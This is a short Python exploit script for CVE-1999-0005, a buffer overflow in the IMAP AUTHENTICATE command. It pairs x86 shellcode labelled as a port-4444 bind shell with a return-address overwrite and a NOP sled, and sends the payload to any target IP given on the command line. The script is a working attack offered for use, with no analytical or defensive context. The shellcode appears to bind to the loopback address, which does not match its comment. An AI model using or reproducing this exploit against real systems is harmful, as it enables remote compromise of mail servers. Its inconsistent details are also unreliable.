#!/usr/bin/env python3
# CVE-1999-0005 - Remote IMAP Authenticate Buffer Overflow Exploit

import socket
import struct
import argparse

# Linux x86 bind shell on port 4444
SHELLCODE = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
    b"\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x68\x7f\x00"
    b"\x00\x01\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1"
    b"\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3"
    b"\x05\x6a\x00\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f"
    b"\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
    b"\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

def build_payload():
    padding = b"A" * 260
    ret_addr = struct.pack("<I", 0xbffff7c0)  # adjust to match stack address in real environment
    buffer = padding + ret_addr * 4 + b"\x90" * 100 + SHELLCODE
    return buffer

def exploit_imap(target_ip, port, payload):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        banner = s.recv(1024)
        s.send(b'A001 AUTHENTICATE ' + payload + b'\r\n')
        print(f"[+] Payload sent to {target_ip}:{port}")
        print("[+] If successful, connect to target on port 4444")
        s.close()
    except Exception as e:
        print(f"[!] Exploit failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="CVE-1999-0005 - IMAP AUTHENTICATE Command Buffer Overflow Exploit")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=143, help="IMAP port (default: 143)")
    args = parser.parse_args()

    payload = build_payload()
    exploit_imap(args.target, args.port, payload)

if __name__ == "__main__":
    main()
